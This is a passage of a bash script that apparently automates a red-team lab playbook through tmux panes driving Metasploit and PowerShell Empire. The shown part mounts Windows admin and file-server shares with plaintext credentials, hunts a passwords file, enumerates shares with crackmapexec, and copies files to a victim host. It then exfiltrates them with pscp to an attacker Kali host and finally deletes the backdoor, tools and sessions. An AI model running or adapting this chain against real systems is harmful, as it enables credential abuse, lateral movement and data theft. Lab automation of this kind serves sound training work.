    # Map LKANE-ADMIN Share
    printf "\nMSF - Mounting lkane-admin share  ... 5s ..."
    tmux select-pane -t $MSF
    tmux send-keys "net use x: \\\\pc-lkane\lkane-admin /u:pc-lkane\lkane-admin                                                                                         Ednott11@lka" Enter | sleep 5s
    interactive

    # Go Password hunting
    printf "\nMSF - Going password hunting ... 5s ..."
    tmux select-pane -t $MSF
    tmux send-keys "type x:\passwords.txt" Enter | sleep 5s
    interactive

    # Dump Server Shares
    printf "\nMSF - Dumping server shares ... 30s ..."
    tmux select-pane -t $MSF
    tmux send-keys "cme -u backups -p Ednott11@bac -d archer.local 10.$LAB.100.9                                                                                        9 --shares" Enter | sleep 30s
    interactive

    # Map File Server Share
    printf "\nMSF - Mapping file server shares ... 10s ..."
    tmux select-pane -t $MSF
    tmux send-keys "net use z: \\\\fs01\mission /u:archer\backups Ednott11@bac"                                                                                         Enter | sleep 10s
    interactive

    # Display files
    printf "\nMSF - Displaying the files ... 5s ..."
    tmux select-pane -t $MSF
    tmux send-keys "dir z:" Enter | sleep 5s
    interactive

    # Prepare for the Loot
    printf "\nMSF - Creating temp directory to store the l00t ... 5s ..."
    tmux select-pane -t $MSF
    tmux send-keys "mkdir c:\users\public\temp" Enter | sleep 2s
    interactive

    # Transfer the Loot to Victim
    printf "\nMSF - Moving the l00t from server to victim ... 45s ..."
    tmux select-pane -t $MSF
    tmux send-keys "copy z:\*.* c:\users\public\temp" Enter | sleep 45s
    interactive

    # Exfiltrate the L00T
    printf "\nMSF - Exfiltrating the l00t ... 215s ..."
    tmux select-pane -t $MSF
    tmux send-keys "echo y | c:\users\public\pscp.exe -pw $KALIPASS -r c:\users\                                                                                        public\temp kali@$KALI_IP:/home/kali/lab/playbooks/pb001" Enter | sleep 120s
    interactive

    # Congratulations
    tmux select-pane -t $CONTROL && printf "\n\n\nCONGRATULATIONS ... This compl                                                                                        etes the exercise.\n\n"
    printf "\nStart: $START"
    printf "\nEnd: $(date)"
}

cleanup() {
    tmux select-pane -t $CONTROL && printf "\n\n"
    read -p "Do you want to clean up the mess you made? (y/n): " RESPONSE
    if [ "$RESPONSE" == "y" ]
    then

        # Let's try and cleanup Windows
        printf "\nMSF - Cleaning up windows files ... "
        tmux select-pane -t $MSF
        tmux send-keys "cd c:\users\public" Enter | sleep 10s
        tmux send-keys "del c:\users\public\pscp.exe" Enter | sleep 10s
        tmux send-keys "del c:\users\public\7za.exe" Enter | sleep 10s
        tmux send-keys "del c:\users\public\SharpHound.exe" Enter | sleep 10s
        tmux send-keys "del /q /s c:\users\public\temp\*.*" Enter | sleep 10s
        tmux send-keys "rmdir /q /s c:\users\public\temp" Enter | sleep 10s
        tmux send-keys "del c:\users\public\tools.tar.gz" Enter | sleep 10s
        tmux send-keys "del c:\users\public\tools.tar" Enter | sleep 10s
        tmux send-keys "del /q /s c:\users\public\tools\*.*" Enter | sleep 10s
        tmux send-keys "rmdir /q /s c:\users\public\tools" Enter | sleep 10s
        tmux send-keys "net use x: /delete" Enter | sleep 10s
        tmux send-keys "net use z: /delete" Enter | sleep 10s

        # Let's clean up Metasploit
        tmux select-pane -t $CONTROL && printf "\nMSF - Killing meterpreter sess                                                                                        ions ... "
        tmux select-pane -t $MSF
        tmux send-keys "exit" Enter | sleep 10s
        tmux send-keys "bg" Enter | sleep 3s
        tmux send-keys "sessions -k 1-20" Enter | sleep 10s
        tmux send-keys "exit" Enter

        # Let's clean up psEmpire
        tmux select-pane -t $CONTROL && printf "\nEMPIRE - Killing empire sessio                                                                                        ns and listener ... 30s ..."
        tmux select-pane -t $EMPIRE
        tmux send-keys "shell 'del c:\users\public\https_backdoor.exe'" Enter |                                                                                         sleep 10s
        tmux send-keys "back" Enter
        tmux send-keys "kill all" Enter
        tmux send-keys "y" Enter
        sleep 30s
        tmux send-keys "kill stale" Enter
        tmux send-keys "back" Enter
        tmux send-keys "listeners" Enter
        tmux send-keys "kill http" Enter
        tmux send-keys "exit" Enter
        tmux send-keys "y" Enter

        # Let's clean up Kali
        tmux select-pane -t $CONTROL && printf "\nMSF - Cleaning up kali files                                                                                          ... 15s ..."
        tmux select-pane -t $MSF
        tmux send-keys "rm -rf /home/kali/lab/playbooks/pb001/temp" Enter
        tmux send-keys "rm -rf /home/kali/lab/playbooks/pb001/*_Bloodhound.zip"                                                                                         Enter
        tmux send-keys "rm -rf /home/kali/lab/apps/Empire/downloads/*" Enter
        tmux send-keys "rm -rf /home/kali/.msf4/loot/*" Enter
        sleep 5s

        # Clearing MSF
        tmux select-pane -t $CONTROL && printf "\MSF - Leaving MSF ..."
        tmux select-pane -t $MSF
        tmux send-keys "cd /home/kali" Enter
        tmux send-keys "clear" Enter

        # Clearing EMPIRE
        tmux select-pane -t $CONTROL && printf "\EMPIRE - Leaving Empire ..."
        tmux select-pane -t $EMPIRE
        tmux send-keys "cd /home/kali" Enter
        tmux send-keys "clear" Enter

        # Clearning CONTROL
        tmux select-pane -t $CONTROL && printf "\CONTROL - Leaving Control ..."
        tmux select-pane -t $CONTROL
        tmux send-keys "cd /home/kali" Enter
        tmux send-keys "clear" Enter

        # Clearing TMUX httpserver
        tmux select-pane -t $CONTROL && printf "\CONTROL - Killing HTTPServer ..                                                                                        ."
        tmux kill-session -t HTTPSERVER

        printf "\n\n\nClean enough for me.  Enjoy the rest of your day.\n\n\n"

    else
        printf "\n\nI don't blame you.  Sure sounds like a problem for future me                                                                                        .\n\n"
    fi
}

# MAIN
profile
warning
initiate_environment
initiate_initial_compromise
attack
cleanup